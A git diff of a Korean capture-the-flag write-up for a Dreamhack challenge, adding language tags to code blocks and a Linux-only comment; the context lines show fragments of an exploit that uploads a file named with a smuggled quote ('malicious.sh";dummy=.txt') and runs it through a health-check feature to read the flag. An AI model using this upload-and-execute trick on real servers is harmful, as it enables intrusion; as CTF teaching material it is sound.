@@ -79,7 +79,7 @@ Admin Console 접근에 성공하였지만, 바로 FLAG를 얻을 수 있는 것
 
 ## bot.DownloadFIle
 
-```
+```java
 func DownloadFile(url, saveDir string) error {
 …….
 
@@ -116,7 +116,7 @@ func DownloadFile(url, saveDir string) error {
 
 ## bot.Healthcheck
 
-```
+```java
 func Healthcheck(target string) string {
     matched, _ := regexp.MatchString("^[a-zA-Z0-9]+$", target)
     if !matched {
@@ -145,7 +145,7 @@ FLAG 파일 내용을 읽어서 /app/uploads/client 디렉터리의 test.txt 파
 
 #### 쉘 스크립트 코드
 
-```
+```sh
 #!/bin/bash
 
 # 읽을 파일
@@ -193,7 +193,7 @@ Health Check 기능을 사용하여 업로드한 malicious.sh 를 실행한다. 
 
 ## 익스플로잇 코드
 
-```
+```python
 import requests
 
 URL = "http://host1.dreamhack.games:20299"
@@ -214,7 +214,7 @@ session.post(f"{URL}/auth/login",json=login)
 
 # 1. Upload File
 
-with open('./malicious.sh";dummy=.txt','rb') as f:
+with open('./malicious.sh";dummy=.txt','rb') as f: # 리눅스에서만 가능 (Windows에서는 파일 이름에 " 포함 불가)
     upload = {'file' : f}
     res = session.post(f"{URL}/admin/upload",headers=headers,files=upload)
 
